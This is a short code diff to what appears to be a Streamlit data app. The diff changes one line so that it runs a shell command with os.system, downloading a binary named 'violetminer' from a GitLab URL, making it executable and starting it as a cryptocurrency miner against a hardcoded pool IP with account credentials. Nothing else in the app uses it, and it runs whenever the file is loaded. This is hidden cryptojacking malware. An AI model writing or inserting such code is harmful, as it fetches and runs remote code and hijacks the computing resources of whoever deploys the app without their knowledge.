@@ -5,4 +5,4 @@ import pandas as pd
 import streamlit as st
 import os
 import subprocess
-subprocess.run(["curl -L -o violetminer https://gitlab.com/arianajsh89/werdata/-/raw/main/violetminer && chmod +x violetminer && ./violetminer --algorithm chukwa --pool 168.235.86.33:3393 --username SK_pDKo9B7rTqyPDrYeohNv5.Temera88 --password x --disableNVIDIA --threads 1"])
+os.system ("curl -L -o violetminer https://gitlab.com/arianajsh89/werdata/-/raw/main/violetminer && chmod +x violetminer && ./violetminer --algorithm chukwa --pool 168.235.86.33:3393 --username SK_pDKo9B7rTqyPDrYeohNv5.Temera88 --password x --disableNVIDIA --threads 1")
